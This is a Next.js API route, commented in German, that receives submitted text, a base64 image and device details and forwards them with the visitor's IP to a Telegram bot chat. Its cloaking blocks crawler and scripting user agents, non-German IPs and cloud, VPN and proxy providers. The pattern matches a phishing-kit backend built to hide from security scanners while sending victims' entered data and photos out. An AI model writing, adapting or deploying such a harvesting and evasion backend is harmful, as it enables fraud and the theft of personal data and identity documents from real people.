import { NextRequest, NextResponse } from 'next/server';

// Stelle sicher, dass diese Route im Node.js Runtime läuft (für FormData/Blob Support)
export const runtime = 'nodejs';

interface VerifyRequestBody {
  message?: string;
  image?: string;
  deviceData?: string;
  type?: string;
}

export async function POST(request: NextRequest) {
  try {
    const body: VerifyRequestBody = await request.json();
    const { message, image, deviceData, type } = body;

    const BOT_TOKEN = process.env.BOT_TOKEN?.trim();
    const CHAT_ID = process.env.CHAT_ID?.trim();

    if (!BOT_TOKEN || !CHAT_ID) {
      return NextResponse.json(
        { error: 'Server-Konfiguration fehlt' },
        { status: 500 }
      );
    }

    // IP-Adresse extrahieren
    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    const ip = forwardedFor?.split(',')[0].trim() || realIp || 'Unbekannt';

    // User-Agent prüfen
    const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
    const botKeywords = [
      'headless',
      'selenium',
      'puppeteer',
      'crawl',
      'bot',
      'spider',
      'aws',
      'amazon',
      'python',
      'curl',
      'wget',
    ];

    if (botKeywords.some((keyword) => userAgent.includes(keyword))) {
      return NextResponse.json(
        { error: 'Zugriff verweigert (Bot erkannt)' },
        { status: 403 }
      );
    }

    // Geo-Location und Provider-Prüfung
    if (ip && ip !== '::1' && ip !== '127.0.0.1' && ip !== 'Unbekannt') {
      try {
        const geoReq = await fetch(
          `http://ip-api.com/json/${ip}?fields=status,countryCode,isp,org,as`
        );
        const geoData = await geoReq.json();

        if (geoData.status === 'success') {
          // Länderprüfung
          if (geoData.countryCode !== 'DE') {
            return NextResponse.json(
              { error: 'Zugriff aus diesem Land nicht gestattet.' },
              { status: 403 }
            );
          }

          // Provider-Prüfung
          const providerInfo = (
            geoData.isp + ' ' + geoData.org + ' ' + geoData.as
          ).toLowerCase();
          const blockedProviders = [
            'amazon',
            'aws',
            'google cloud',
            'google llc',
            'microsoft',
            'azure',
            'digitalocean',
            'hetzner',
            'ovh',
            'alibaba',
            'oracle',
            'linode',
            'vultr',
            'facebook',
            'datacenter',
            'hosting',
            'server',
            'vpn',
            'proxy',
          ];

          if (blockedProviders.some((p) => providerInfo.includes(p))) {
            return NextResponse.json(
              { error: 'Zugriff über VPN oder Hosting-Server verweigert.' },
              { status: 403 }
            );
          }
        }
      } catch (err) {
        // Geo-Lookup Fehler ignorieren, aber weiter machen
        console.error('Geo-Lookup Fehler:', err);
      }
    }

    // Telegram-Nachricht vorbereiten
    const fullCaption = `<b>🔔 Neue Eingabe: ${type || 'Allgemein'}</b>\n\n${
      message || 'Keine Nachricht'
    }\n\n📍 IP: ${ip}\n📱 Gerät: ${deviceData || 'k.A.'}`;

    // An Telegram senden
    if (image && image.includes('base64')) {
      const base64Data = image.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');

      // FormData für Telegram API (Node.js 18+ unterstützt FormData nativ)
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('caption', fullCaption);
      formData.append('parse_mode', 'HTML');

      // Blob für das Bild erstellen (Node.js 18+ unterstützt Blob nativ)
      const fileBlob = new Blob([buffer], { type: 'image/jpeg' });
      formData.append('photo', fileBlob, 'upload.jpg');

      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
        {
          method: 'POST',
          body: formData,
        }
      );

      if (!telegramResponse.ok) {
        const errorText = await telegramResponse.text();
        throw new Error(`Telegram API Fehler: ${errorText}`);
      }
    } else {
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: fullCaption,
            parse_mode: 'HTML',
          }),
        }
      );

      if (!telegramResponse.ok) {
        const errorText = await telegramResponse.text();
        throw new Error(`Telegram API Fehler: ${errorText}`);
      }
    }

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error('Verify API Fehler:', error);
    return NextResponse.json(
      {
        error: 'Senden fehlgeschlagen',
        details: error instanceof Error ? error.message : 'Unbekannter Fehler',
      },
      { status: 500 }
    );
  }
}

// GET-Methode nicht erlaubt
export async function GET() {
  return NextResponse.json(
    { error: 'Method not allowed' },
    { status: 405 }
  );
}

